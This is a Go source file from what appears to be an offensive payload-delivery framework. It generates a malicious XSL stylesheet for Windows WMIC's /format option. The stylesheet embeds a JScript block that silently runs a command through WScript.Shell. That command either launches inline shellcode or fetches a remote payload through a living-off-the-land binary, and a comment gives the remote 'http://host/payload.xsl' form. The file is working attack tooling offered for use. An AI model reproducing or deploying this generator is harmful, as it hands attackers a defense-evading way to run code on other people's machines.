// xsl.go — emit an XSL stylesheet (.xsl) consumable by `wmic os get
// /format:"payload.xsl"` (or `/format:"http://host/payload.xsl"` for remote).
// WMIC's XSL engine evaluates msxsl:script blocks; we use a JScript block to
// launch the inline stager (inline mode) or a LOLBin fetch (remote mode).
package delivery

import "strings"

type xslEmitter struct{}

func (xslEmitter) Name() string { return "xsl" }
func (xslEmitter) Ext() string  { return "xsl" }

func (xslEmitter) Emit(s *Spec) ([]Artifact, error) {
	var cmd string
	switch {
	case s.Remote():
		cmd = lolbinRemote(s.Launcher, s.URL)
	case len(s.Shellcode) > 0:
		cmd = launcherInlineCmd(s.Shellcode)
	default:
		return nil, errPayloadRequired("xsl")
	}
	body := xslBody(cmd)
	return []Artifact{writeFile("payload.xsl", []byte(body))}, nil
}

// xslBody renders a wmic-consumable XSL whose msxsl:script runs `cmd`.
func xslBody(cmd string) string {
	var b strings.Builder
	b.WriteString(`<?xml version='1.0'?>` + "\n")
	b.WriteString(`<xsl:stylesheet version="1.0"`)
	b.WriteString(` xmlns:xsl="http://www.w3.org/1999/XSL/Transform"`)
	b.WriteString(` xmlns:msxsl="urn:schemas-microsoft-com:xslt">` + "\n")
	b.WriteString(`<msxsl:script language="JScript" implements-prefix="user">` + "\n")
	b.WriteString("<![CDATA[\n")
	b.WriteString("function run() {\n")
	b.WriteString("  var s = new ActiveXObject(\"WScript.Shell\");\n")
	b.WriteString("  s.Run(\"" + jsEscape(cmd) + "\", 0, false);\n")
	b.WriteString("  return \"\";\n")
	b.WriteString("}\n")
	b.WriteString("]]>\n")
	b.WriteString("</msxsl:script>\n")
	b.WriteString(`<xsl:template match="/">` + "\n")
	b.WriteString(`<xsl:value-of select="user:run()"/>` + "\n")
	b.WriteString("</xsl:template>\n")
	b.WriteString("</xsl:stylesheet>\n")
	return b.String()
}